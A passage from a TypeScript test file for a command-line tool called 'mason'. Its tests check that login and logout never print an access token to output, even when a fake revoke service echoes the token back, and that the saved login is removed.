        assert.equal(fs.existsSync(credentials(h)), false, `${what}: never saved`);
        assert.ok(!showsRun(a.stdout + a.stderr, token), `${what}: printed the token`);
      } finally { await fake.close(); }
    }
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("mason logout: a revoke's answer is never read but for its status — one carrying the token whole, its body, in lower case or 11 of its characters in a row prints none of it, and the login is removed (issue 627)", { timeout: 300_000 }, async () => {
  const token = runToken("pat", 0); SECRETS.push(token);
  for (const [what, reply] of [["a 200", (v: string): Reply => ({ status: 200, body: { note: v } })], ["a 400", (v: string): Reply => ({ status: 400, body: { error: v, error_description: v } })]] as const) {
    await eachForm(token, 0, async (v, _, json, form) => {
      const fake = await fakeService({ revoke: reply(v) });
      try {
        const h = home();
        writeSaved(h, { [fake.url]: { token, email: "ada@example.com", savedAt: "2026-11-01T00:00:00.000Z" } });
        const a = await mason(h, ["logout", ...(json ? ["--json"] : [])], envFor(h, fake.url));
        const at = `${what}, ${form}`, all = `${a.stdout}\n${a.stderr}`;
        assert.equal(a.code, 0, `${at}: ${all}`);
        assert.ok(!showsRun(all, token), `${at}: printed the token:\n${all}`);
        assert.equal(Object.keys(saved(h).logins).length, 0, `${at}: signed out`);
      } finally { await fake.close(); }
    });
  }
});

test("no token reaches any stdout or stderr of mason login or mason logout, in any run of this file, success or failure", () => {
  noTokenLeaked([["login", true], ["login", false], ["logout", true]]);
});
